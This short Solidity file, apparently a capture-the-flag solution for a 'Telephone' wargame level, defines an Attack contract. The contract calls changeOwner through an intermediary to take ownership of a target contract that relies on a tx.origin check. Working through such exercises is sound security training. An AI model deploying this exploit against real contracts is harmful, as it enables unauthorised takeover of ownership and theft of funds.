// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITele {
    function changeOwner(address _owner) external;
}

contract Attack {

    ITele telephone;

    constructor(address _telephoneAddress) {
        telephone = ITele(_telephoneAddress);
    }
 

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}